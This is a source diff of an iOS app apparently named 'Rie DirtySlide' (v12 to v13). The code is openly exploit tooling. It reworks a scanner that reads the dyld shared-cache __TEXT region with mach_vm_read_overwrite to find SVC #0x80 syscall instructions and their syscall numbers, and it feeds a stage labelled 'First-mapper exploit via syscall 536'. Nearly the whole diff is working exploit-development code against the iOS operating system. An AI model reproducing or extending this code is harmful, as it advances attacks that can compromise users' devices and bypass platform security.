@@ -144,7 +144,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v12 ==="];
+    [self log:@"=== Rie DirtySlide v13 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -372,28 +372,50 @@ typedef struct {
         return;
     }
 
-    // For dylib in shared cache: __TEXT is mapped at dyldAddr (vmaddr typically 0)
-    uint64_t scanBase = dyldAddr;
+    // For shared cache dylib: __TEXT is at vmaddr (absolute address in shared region)
+    // NOT at dyldAddr (which is a local Mach-O header copy created by dyld)
+    uint64_t scanBase = textAddr; // 0x1800e6000 — actual __TEXT in shared region
     size_t scanLimit = (textSize < 0x40000) ? (size_t)textSize : 0x40000;
 
-    [self log:[NSString stringWithFormat:@"Scanning __TEXT from 0x%llx (first %zuKB) for SVC #0x80...",
+    [self log:[NSString stringWithFormat:@"Scanning __TEXT at vmaddr 0x%llx (first %zuKB) for SVC #0x80...",
         scanBase, scanLimit / 1024]];
 
+    // Use mach_vm_read_overwrite to avoid SIGBUS on unmapped pages
+    Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+    size_t chunk = 0x8000; // 32KB per read
+    uint8_t *buf = (uint8_t *)malloc(chunk);
+    if (!buf) { [self log:@"!! malloc"]; return; }
+
     size_t svcFound = 0;
-    for (size_t off = 0; off + 4 <= scanLimit && svcFound < 50; off += 4) {
-        uint32_t insn = *(uint32_t *)(scanBase + off);
-        if (insn == 0xD4000081) {
-            uint64_t insnAddr = scanBase + off;
-            uint32_t prev = (off >= 4) ? *(uint32_t *)(scanBase + off - 4) : 0;
-            uint16_t movzVal = 0;
-            if ((prev & 0xFFE00000) == 0xD2800000) {
-                movzVal = (uint16_t)((prev >> 5) & 0xFFFF);
+    for (size_t scanOff = 0; scanOff < scanLimit && svcFound < 50; scanOff += chunk) {
+        size_t thisChunk = ((scanLimit - scanOff) < chunk) ? (scanLimit - scanOff) : chunk;
+        memset(buf, 0, thisChunk);
+        rie_mach_vm_size_t got = 0;
+        kern_return_t kr = vmr2(mach_task_self(), scanBase + scanOff, thisChunk,
+            (rie_mach_vm_address_t)(uintptr_t)buf, &got);
+        if (kr != KERN_SUCCESS) {
+            [self log:[NSString stringWithFormat:@"!! vmr(@0x%llx) failed: kr=%d(%s) — page not mapped",
+                scanBase + scanOff, kr, mach_error_string(kr)]];
+            break;
+        }
+        if (got < 4) break;
+
+        for (size_t j = 0; j + 4 <= got && svcFound < 50; j += 4) {
+            uint32_t insn = *(uint32_t *)(buf + j);
+            if (insn == 0xD4000081) {
+                uint64_t insnAddr = scanBase + scanOff + j;
+                uint32_t prev = (j >= 4) ? *(uint32_t *)(buf + j - 4) : 0;
+                uint16_t movzVal = 0;
+                if ((prev & 0xFFE00000) == 0xD2800000) {
+                    movzVal = (uint16_t)((prev >> 5) & 0xFFFF);
+                }
+                [self log:[NSString stringWithFormat:@"SVC[%zu] @0x%llx insn=0x%08x prev=0x%08x movz_x16=%u(0x%x)",
+                    svcFound, (unsigned long long)insnAddr, insn, prev, movzVal, movzVal]];
+                svcFound++;
             }
-            [self log:[NSString stringWithFormat:@"SVC[%zu] @0x%llx insn=0x%08x prev=0x%08x movz_x16=%u(0x%x)",
-                svcFound, (unsigned long long)insnAddr, insn, prev, movzVal, movzVal]];
-            svcFound++;
         }
     }
+    free(buf);
 
     if (svcFound == 0) {
         [self log:@"!! No SVC #0x80 found in dyld __TEXT (first 256KB)"];
@@ -512,7 +534,7 @@ typedef struct {
 // ── Stage 3: First-mapper exploit via syscall 536 (v8: child spawn probe) ──
 - (void)runFirstMapper {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"\n── Stage 3: Rie v12 First-Mapper ──"];
+        [self log:@"\n── Stage 3: Rie v13 First-Mapper ──"];
         [self clearRelaunchFlag];
 
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
